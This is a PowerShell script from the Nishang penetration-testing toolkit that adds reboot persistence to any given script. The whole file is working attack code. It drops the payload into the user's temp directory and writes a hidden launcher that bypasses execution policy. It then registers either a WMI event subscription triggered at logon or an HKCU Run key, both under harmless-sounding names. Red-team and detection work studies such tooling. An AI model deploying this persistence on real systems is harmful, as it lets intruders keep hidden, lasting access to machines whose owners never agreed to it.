<#
.SYNOPSIS
Nishang script which could be used to add reboot persistence to a powershell script.

.DESCRIPTION
This script accepts path of a script to which reboot persistence is to be added.
The target sript is dropped into the user's temp directory and either WMI permanent event consumer or Registry changes is used (based on privs) for persistence.
Persistence created using this script could be cleaned by using the Remove-Persistence.ps1 script in Nishang.

.PARAMETER ScriptPath
Path of the script to which persistence is to be added.

.Example
PS > Add-Persistence -ScriptPath C:\script.ps1

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>



function Add-Persistence
{    
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [String]
        $ScriptPath
    )
    
    
    $body = Get-Content $ScriptPath
    $modulename = $script:MyInvocation.MyCommand.Name
    $name = "persist.vbs"
    Out-File -InputObject $body -Force $env:TEMP\$modulename
    echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
    echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
    {
        $scriptpath = $env:TEMP
        $scriptFileName = "$scriptpath\$name"
        $filterNS = "root\cimv2"
        $wmiNS = "root\subscription"
        $query = @"
            Select * from __InstanceCreationEvent within 30 
            where targetInstance isa 'Win32_LogonSession' 
"@
        $filterName = "WindowsSanity"
        $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
        $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
    }
    else
    {
        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
    }    
}

